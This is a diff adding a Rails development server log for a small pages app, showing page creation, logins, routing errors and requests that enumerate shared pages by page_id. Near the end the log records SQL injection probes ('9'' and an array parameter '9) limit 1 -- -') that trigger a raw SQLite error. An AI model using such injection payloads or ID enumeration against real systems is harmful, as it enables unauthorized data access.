+puma (4.3.6) lib/puma/server.rb:713:in `handle_request'
+puma (4.3.6) lib/puma/server.rb:472:in `process_client'
+puma (4.3.6) lib/puma/server.rb:328:in `block in run'
+puma (4.3.6) lib/puma/thread_pool.rb:134:in `block in spawn_thread'
+Started GET "/pages/new" for ::1 at 2021-03-29 12:08:37 +0800
+Processing by PagesController#new as HTML
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 4], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  Rendering pages/new.html.erb within layouts/application
+  Rendered pages/new.html.erb within layouts/application (Duration: 7.3ms | Allocations: 1311)
+Completed 200 OK in 26ms (Views: 10.1ms | ActiveRecord: 0.8ms | Allocations: 6266)
+
+
+Started POST "/pages" for ::1 at 2021-03-29 12:08:40 +0800
+Processing by PagesController#create as HTML
+  Parameters: {"authenticity_token"=>"L2B0uJAJBg7mUezzM1ok2qG3qmJqyFNuyPntJc+12Bi2ANK390l24vB1iL2cMM1O6puE+CVOeajluibRl8EMAQ==", "page"=>{"title"=>"asdasd", "text"=>"asdasd"}, "commit"=>"Save Page"}
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 4], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[35m (0.1ms)[0m  [1m[36mbegin transaction[0m
+  ↳ app/controllers/pages_controller.rb:20:in `create'
+  [1m[36mPage Create (0.4ms)[0m  [1m[32mINSERT INTO "pages" ("title", "text", "created_at", "updated_at") VALUES (?, ?, ?, ?)[0m  [["title", "asdasd"], ["text", "asdasd"], ["created_at", "2021-03-29 04:08:40.895797"], ["updated_at", "2021-03-29 04:08:40.895797"]]
+  ↳ app/controllers/pages_controller.rb:20:in `create'
+  [1m[35m (2.3ms)[0m  [1m[36mcommit transaction[0m
+  ↳ app/controllers/pages_controller.rb:20:in `create'
+Redirected to http://localhost:3000/
+Completed 302 Found in 14ms (ActiveRecord: 2.9ms | Allocations: 4557)
+
+
+Started GET "/" for ::1 at 2021-03-29 12:08:40 +0800
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 3.3ms | Allocations: 950)
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 4], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+Completed 200 OK in 8ms (Views: 6.0ms | ActiveRecord: 0.2ms | Allocations: 2134)
+
+
+Started GET "/pages" for ::1 at 2021-03-29 12:09:01 +0800
+  
+ActionController::RoutingError (No route matches [GET] "/pages"):
+  
+actionpack (6.0.3.3) lib/action_dispatch/middleware/debug_exceptions.rb:36:in `call'
+web-console (4.0.4) lib/web_console/middleware.rb:132:in `call_app'
+web-console (4.0.4) lib/web_console/middleware.rb:28:in `block in call'
+web-console (4.0.4) lib/web_console/middleware.rb:17:in `catch'
+web-console (4.0.4) lib/web_console/middleware.rb:17:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/show_exceptions.rb:33:in `call'
+railties (6.0.3.3) lib/rails/rack/logger.rb:37:in `call_app'
+railties (6.0.3.3) lib/rails/rack/logger.rb:26:in `block in call'
+activesupport (6.0.3.3) lib/active_support/tagged_logging.rb:80:in `block in tagged'
+activesupport (6.0.3.3) lib/active_support/tagged_logging.rb:28:in `tagged'
+activesupport (6.0.3.3) lib/active_support/tagged_logging.rb:80:in `tagged'
+railties (6.0.3.3) lib/rails/rack/logger.rb:26:in `call'
+sprockets-rails (3.2.2) lib/sprockets/rails/quiet_assets.rb:13:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/remote_ip.rb:81:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/request_id.rb:27:in `call'
+rack (2.2.3) lib/rack/method_override.rb:24:in `call'
+rack (2.2.3) lib/rack/runtime.rb:22:in `call'
+activesupport (6.0.3.3) lib/active_support/cache/strategy/local_cache_middleware.rb:29:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/executor.rb:14:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/static.rb:126:in `call'
+rack (2.2.3) lib/rack/sendfile.rb:110:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/host_authorization.rb:82:in `call'
+webpacker (4.3.0) lib/webpacker/dev_server_proxy.rb:23:in `perform_request'
+rack-proxy (0.6.5) lib/rack/proxy.rb:57:in `call'
+railties (6.0.3.3) lib/rails/engine.rb:527:in `call'
+puma (4.3.6) lib/puma/configuration.rb:228:in `call'
+puma (4.3.6) lib/puma/server.rb:713:in `handle_request'
+puma (4.3.6) lib/puma/server.rb:472:in `process_client'
+puma (4.3.6) lib/puma/server.rb:328:in `block in run'
+puma (4.3.6) lib/puma/thread_pool.rb:134:in `block in spawn_thread'
+Started GET "/pages/share" for ::1 at 2021-03-29 12:09:03 +0800
+Processing by PagesController#show as HTML
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 4], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.8ms | Allocations: 198)
+Completed 200 OK in 8ms (Views: 3.0ms | ActiveRecord: 0.2ms | Allocations: 1537)
+
+
+Started GET "/pages/share" for ::1 at 2021-03-29 12:09:05 +0800
+Processing by PagesController#show as HTML
+  [1m[36mUser Load (0.3ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 4], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.1ms | Allocations: 4)
+Completed 200 OK in 13ms (Views: 5.3ms | ActiveRecord: 0.3ms | Allocations: 1174)
+
+
+Started GET "/" for ::1 at 2021-03-29 12:09:27 +0800
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 3.8ms | Allocations: 950)
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 4], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+Completed 200 OK in 9ms (Views: 7.2ms | ActiveRecord: 0.2ms | Allocations: 2110)
+
+
+Started GET "/" for ::1 at 2021-03-29 12:09:34 +0800
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 2.4ms | Allocations: 941)
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 4], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+Completed 200 OK in 7ms (Views: 5.5ms | ActiveRecord: 0.2ms | Allocations: 2119)
+
+
+Started GET "/" for ::1 at 2021-03-29 12:09:34 +0800
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 3.7ms | Allocations: 941)
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 4], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+Completed 200 OK in 9ms (Views: 7.1ms | ActiveRecord: 0.2ms | Allocations: 2101)
+
+
+Started GET "/" for ::1 at 2021-03-29 12:09:35 +0800
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 7.2ms | Allocations: 941)
+  [1m[36mUser Load (0.5ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 4], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+Completed 200 OK in 15ms (Views: 12.9ms | ActiveRecord: 0.5ms | Allocations: 2105)
+
+
+Started GET "/pages?page_id=1" for ::1 at 2021-03-29 12:10:04 +0800
+  
+ActionController::RoutingError (No route matches [GET] "/pages"):
+  
+actionpack (6.0.3.3) lib/action_dispatch/middleware/debug_exceptions.rb:36:in `call'
+web-console (4.0.4) lib/web_console/middleware.rb:132:in `call_app'
+web-console (4.0.4) lib/web_console/middleware.rb:28:in `block in call'
+web-console (4.0.4) lib/web_console/middleware.rb:17:in `catch'
+web-console (4.0.4) lib/web_console/middleware.rb:17:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/show_exceptions.rb:33:in `call'
+railties (6.0.3.3) lib/rails/rack/logger.rb:37:in `call_app'
+railties (6.0.3.3) lib/rails/rack/logger.rb:26:in `block in call'
+activesupport (6.0.3.3) lib/active_support/tagged_logging.rb:80:in `block in tagged'
+activesupport (6.0.3.3) lib/active_support/tagged_logging.rb:28:in `tagged'
+activesupport (6.0.3.3) lib/active_support/tagged_logging.rb:80:in `tagged'
+railties (6.0.3.3) lib/rails/rack/logger.rb:26:in `call'
+sprockets-rails (3.2.2) lib/sprockets/rails/quiet_assets.rb:13:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/remote_ip.rb:81:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/request_id.rb:27:in `call'
+rack (2.2.3) lib/rack/method_override.rb:24:in `call'
+rack (2.2.3) lib/rack/runtime.rb:22:in `call'
+activesupport (6.0.3.3) lib/active_support/cache/strategy/local_cache_middleware.rb:29:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/executor.rb:14:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/static.rb:126:in `call'
+rack (2.2.3) lib/rack/sendfile.rb:110:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/host_authorization.rb:82:in `call'
+webpacker (4.3.0) lib/webpacker/dev_server_proxy.rb:23:in `perform_request'
+rack-proxy (0.6.5) lib/rack/proxy.rb:57:in `call'
+railties (6.0.3.3) lib/rails/engine.rb:527:in `call'
+puma (4.3.6) lib/puma/configuration.rb:228:in `call'
+puma (4.3.6) lib/puma/server.rb:713:in `handle_request'
+puma (4.3.6) lib/puma/server.rb:472:in `process_client'
+puma (4.3.6) lib/puma/server.rb:328:in `block in run'
+puma (4.3.6) lib/puma/thread_pool.rb:134:in `block in spawn_thread'
+Started GET "/pages/share?page_id=1" for ::1 at 2021-03-29 12:10:23 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>"1"}
+  [1m[36mUser Load (0.4ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 4], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.5ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  [1m[36mPage Load (0.6ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:7:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.2ms | Allocations: 10)
+Completed 200 OK in 22ms (Views: 3.8ms | ActiveRecord: 1.5ms | Allocations: 2468)
+
+
+Started GET "/pages/share?page_id=2" for ::1 at 2021-03-29 12:10:27 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>"2"}
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 4], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 2], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  [1m[36mPage Load (0.2ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 2], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:7:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.1ms | Allocations: 10)
+Completed 200 OK in 9ms (Views: 1.5ms | ActiveRecord: 0.6ms | Allocations: 2313)
+
+
+Started GET "/pages/share?page_id=3" for ::1 at 2021-03-29 12:10:29 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>"3"}
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 4], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  [1m[36mPage Load (0.1ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 3], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:7:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.1ms | Allocations: 10)
+Completed 200 OK in 6ms (Views: 1.1ms | ActiveRecord: 0.4ms | Allocations: 2309)
+
+
+Started GET "/pages/share?page_id=4" for ::1 at 2021-03-29 12:10:36 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>"4"}
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 4], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 4], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  [1m[36mPage Load (0.2ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 4], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:7:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.1ms | Allocations: 10)
+Completed 200 OK in 7ms (Views: 1.4ms | ActiveRecord: 0.4ms | Allocations: 2305)
+
+
+Started GET "/pages/share?page_id=10" for ::1 at 2021-03-29 12:10:38 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>"10"}
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 4], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 10], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.1ms | Allocations: 4)
+Completed 200 OK in 5ms (Views: 1.2ms | ActiveRecord: 0.3ms | Allocations: 1784)
+
+
+Started GET "/pages/share?page_id=7" for ::1 at 2021-03-29 12:10:41 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>"7"}
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 4], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 7], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  [1m[36mPage Load (0.1ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 7], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:7:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.1ms | Allocations: 10)
+Completed 200 OK in 7ms (Views: 1.8ms | ActiveRecord: 0.5ms | Allocations: 2302)
+
+
+Started GET "/pages/share?page_id=8" for ::1 at 2021-03-29 12:10:42 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>"8"}
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 4], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 8], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  [1m[36mPage Load (0.1ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 8], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:7:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.1ms | Allocations: 10)
+Completed 200 OK in 8ms (Views: 1.6ms | ActiveRecord: 0.4ms | Allocations: 2311)
+
+
+Started GET "/pages/share?page_id=9" for ::1 at 2021-03-29 12:10:44 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>"9"}
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 4], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 9], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.1ms | Allocations: 4)
+Completed 200 OK in 5ms (Views: 1.8ms | ActiveRecord: 0.3ms | Allocations: 1774)
+
+
+Started GET "/pages/new" for ::1 at 2021-03-29 12:11:15 +0800
+Processing by PagesController#new as HTML
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 4], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  Rendering pages/new.html.erb within layouts/application
+  Rendered pages/new.html.erb within layouts/application (Duration: 1.8ms | Allocations: 670)
+Completed 200 OK in 6ms (Views: 2.9ms | ActiveRecord: 0.1ms | Allocations: 1812)
+
+
+Started POST "/pages" for ::1 at 2021-03-29 12:11:21 +0800
+Processing by PagesController#create as HTML
+  Parameters: {"authenticity_token"=>"YZww5IrYkL6DHOk286/gye2nRyoVb4Kz1tsyD6Z4VpP4/Jbr7ZjgUpU4jXhcxQldpotpsFrpqHX7mPn7/gyCig==", "page"=>{"title"=>"qqqq", "text"=>"qqqqq"}, "commit"=>"Save Page"}
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 4], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[35m (0.1ms)[0m  [1m[36mbegin transaction[0m
+  ↳ app/controllers/pages_controller.rb:20:in `create'
+  [1m[36mPage Create (0.4ms)[0m  [1m[32mINSERT INTO "pages" ("title", "text", "created_at", "updated_at") VALUES (?, ?, ?, ?)[0m  [["title", "qqqq"], ["text", "qqqqq"], ["created_at", "2021-03-29 04:11:21.923980"], ["updated_at", "2021-03-29 04:11:21.923980"]]
+  ↳ app/controllers/pages_controller.rb:20:in `create'
+  [1m[35m (2.3ms)[0m  [1m[36mcommit transaction[0m
+  ↳ app/controllers/pages_controller.rb:20:in `create'
+Redirected to http://localhost:3000/
+Completed 302 Found in 16ms (ActiveRecord: 3.0ms | Allocations: 4454)
+
+
+Started GET "/" for ::1 at 2021-03-29 12:11:21 +0800
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 2.2ms | Allocations: 941)
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 4], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+Completed 200 OK in 5ms (Views: 4.3ms | ActiveRecord: 0.1ms | Allocations: 2122)
+
+
+Started GET "/pages/share?page_id=9" for ::1 at 2021-03-29 12:12:28 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>"9"}
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 4], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 9], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  [1m[36mPage Load (0.2ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 9], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:7:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.2ms | Allocations: 10)
+Completed 200 OK in 9ms (Views: 2.2ms | ActiveRecord: 0.6ms | Allocations: 2321)
+
+
+Started GET "/pages/share?page_id=9%27" for ::1 at 2021-03-29 12:12:33 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>"9'"}
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 4], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.2ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 9], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+  [1m[36mPage Load (0.1ms)[0m  [1m[34mSELECT "pages".* FROM "pages" WHERE "pages"."id" = ? LIMIT ?[0m  [["id", 9], ["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:7:in `show'
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 0.1ms | Allocations: 10)
+Completed 200 OK in 8ms (Views: 1.8ms | ActiveRecord: 0.5ms | Allocations: 2320)
+
+
+Started GET "/pages/share?page_id[]=9%27" for ::1 at 2021-03-29 12:12:38 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["9'"]}
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 4], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+  [1m[36mPage Exists? (0.9ms)[0m  [1m[34mSELECT 1 AS one FROM "pages" WHERE (9') LIMIT ?[0m  [["LIMIT", 1]]
+  ↳ app/controllers/pages_controller.rb:6:in `show'
+Completed 500 Internal Server Error in 6ms (ActiveRecord: 1.1ms | Allocations: 2160)
+
+
+  
+ActiveRecord::StatementInvalid (SQLite3::SQLException: unrecognized token: "') LIMIT ?"):
+  
+app/controllers/pages_controller.rb:6:in `show'
+Started GET "/pages/share?page_id[]=9)%20limit%201%20--%20-" for ::1 at 2021-03-29 12:15:17 +0800
+  [1m[35m (0.5ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+  [1m[35m (0.1ms)[0m  [1m[34mSELECT "schema_migrations"."version" FROM "schema_migrations" ORDER BY "schema_migrations"."version" ASC[0m
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>["9) limit 1 -- -"]}
+Redirected to http://localhost:3000/login
+Filter chain halted as :authorize rendered or redirected
+Completed 302 Found in 31ms (ActiveRecord: 0.0ms | Allocations: 3075)
+
+
+Started GET "/login" for ::1 at 2021-03-29 12:15:17 +0800
+Processing by SessionsController#new as HTML
+  Rendering sessions/new.html.erb within layouts/application
+  Rendered sessions/new.html.erb within layouts/application (Duration: 5.2ms | Allocations: 2526)
+Completed 200 OK in 12ms (Views: 9.5ms | ActiveRecord: 0.0ms | Allocations: 4927)
+
+
+Started GET "/register" for ::1 at 2021-03-29 12:15:20 +0800
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 8.4ms | Allocations: 1417)
+Completed 200 OK in 35ms (Views: 12.7ms | ActiveRecord: 1.4ms | Allocations: 6654)
+
+
+Started POST "/users" for ::1 at 2021-03-29 12:15:29 +0800
+Processing by UsersController#create as HTML
+  Parameters: {"authenticity_token"=>"/tWqBzEmnGiWqcjnKhkPH2YjQ9EKb6S8EaxewPSi78GXvZJIpJSzh5u5KCq02dPF7MvqKQvDcfxJg2SCPcMZ0A==", "user"=>{"name"=>"yeraisci", "email"=>"yeraisci@mail.com", "password"=>"[FILTERED]", "password_confirmation"=>"[FILTERED]"}, "commit"=>"Sign up!"}
+  [1m[35m (0.1ms)[0m  [1m[36mbegin transaction[0m
+  ↳ app/controllers/users_controller.rb:13:in `create'
+  [1m[36mUser Exists? (0.3ms)[0m  [1m[34mSELECT 1 AS one FROM "users" WHERE "users"."email" = ? LIMIT ?[0m  [["email", "yeraisci@mail.com"], ["LIMIT", 1]]
+  ↳ app/controllers/users_controller.rb:13:in `create'
+  [1m[35m (0.1ms)[0m  [1m[31mrollback transaction[0m
+  ↳ app/controllers/users_controller.rb:13:in `create'
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 2.1ms | Allocations: 967)
+Completed 200 OK in 355ms (Views: 3.2ms | ActiveRecord: 0.4ms | Allocations: 5630)
+
+
+Started GET "/login" for ::1 at 2021-03-29 12:15:30 +0800
+Processing by SessionsController#new as HTML
+  Rendering sessions/new.html.erb within layouts/application
+  Rendered sessions/new.html.erb within layouts/application (Duration: 1.4ms | Allocations: 440)
+Completed 200 OK in 4ms (Views: 2.5ms | ActiveRecord: 0.0ms | Allocations: 1040)
+
+
+Started POST "/login" for ::1 at 2021-03-29 12:15:34 +0800
+Processing by SessionsController#create as HTML
+  Parameters: {"authenticity_token"=>"EjymZTBvi1dhdCIUED1eiqGn2820kbtAWXhcHOYttycLnEIxtIxF+tRAD3Fn5uFXjhjuYD4JQavW68t8p2IOEQ==", "login"=>{"email"=>"yeraisci@mail.com", "password"=>"[FILTERED]"}, "commit"=>"Log In"}
+  [1m[36mUser Load (0.3ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."email" = ? LIMIT ?[0m  [["email", "yeraisci@mail.com"], ["LIMIT", 1]]
+  ↳ app/controllers/sessions_controller.rb:11:in `create'
+  Rendering sessions/new.html.erb within layouts/application
+  Rendered sessions/new.html.erb within layouts/application (Duration: 1.2ms | Allocations: 441)
+Completed 200 OK in 360ms (Views: 2.4ms | ActiveRecord: 0.3ms | Allocations: 1837)
+
+
+Started GET "/pages/share?page_id=9" for ::1 at 2021-03-29 12:15:39 +0800
+Processing by PagesController#show as HTML
+  Parameters: {"page_id"=>"9"}
+Redirected to http://localhost:3000/login
+Filter chain halted as :authorize rendered or redirected
+Completed 302 Found in 2ms (ActiveRecord: 0.0ms | Allocations: 308)
+
+
+Started GET "/login" for ::1 at 2021-03-29 12:15:39 +0800
+Processing by SessionsController#new as HTML
+  Rendering sessions/new.html.erb within layouts/application
+  Rendered sessions/new.html.erb within layouts/application (Duration: 1.9ms | Allocations: 428)
+Completed 200 OK in 5ms (Views: 3.7ms | ActiveRecord: 0.0ms | Allocations: 1039)
+
+
+Started GET "/login" for ::1 at 2021-03-29 12:15:41 +0800
+Processing by SessionsController#new as HTML
+  Rendering sessions/new.html.erb within layouts/application
+  Rendered sessions/new.html.erb within layouts/application (Duration: 3.0ms | Allocations: 429)
+Completed 200 OK in 10ms (Views: 6.9ms | ActiveRecord: 0.0ms | Allocations: 1013)
+
+
+Started POST "/login" for ::1 at 2021-03-29 12:15:44 +0800
+Processing by SessionsController#create as HTML
+  Parameters: {"authenticity_token"=>"1u6bKCtxyAPtRRs32Cl6Wtm2mfdGmKKW+zfalneWjKfPTn98r5IGrlhxNlKv8sWH9gmsWswAWH10pE32Ntk1kQ==", "login"=>{"email"=>"yeraisci@mail.com", "password"=>"[FILTERED]"}, "commit"=>"Log In"}
